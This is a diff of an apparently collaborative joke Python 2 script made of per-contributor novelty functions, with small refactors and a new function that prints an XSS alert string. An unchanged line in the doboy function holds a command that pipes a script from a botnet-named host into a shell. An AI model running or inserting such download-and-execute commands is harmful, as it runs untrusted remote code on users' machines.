@@ -19,13 +19,12 @@ import getpass
 import re
 import hashlib
 import os
-import curses
-import time
 import string
 import math
 import sys
 import inspect
 import webbrowser
+import time
 
 def heinzf():
     """Compare itself with the raw code github. If there's something new, it updates the file localy."""
@@ -56,6 +55,7 @@ def piperchester():
 
 def binary132():
     print "Perl is better.  PS everyone is lazy"
+    daniel_dressler()
 
 def sricola():
     print "Welcome to soCode!!"
@@ -106,6 +106,7 @@ def taylorlapeyre():
 
 
 def kghose():
+    import curses, time
     
     def main_loop(window):
         window.clear()
@@ -237,9 +238,9 @@ def satshabad():
     for x in range(10000):
         r = random.randint(0,1)
         if r == 0:
-            print '/'
+            sys.stdout.write('/')
         else:
-            print '\\'
+            sys.stdout.write('\\')
 
 def henghonglee():
     print "#!brain"
@@ -371,6 +372,13 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
+        
+def ngokevin(shamelessadvertising):
+    # I'm sleepy zzz.
+    time.sleep(5)
+    # Check for XSS.
+    print '<script>alert("HAHAHA");</script>'
+    import antigravity
 
 if __name__ == "__main__":
     heinzf() # this thing makes it hard to make sure stuff works, doesn't it?
@@ -415,6 +423,7 @@ if __name__ == "__main__":
     hazirguo()
     chris911()
     doboy(doboy)
+    ngokevin('ngokevin.com')
 
     # as per instructed, please leave this as the final function
     lafin()
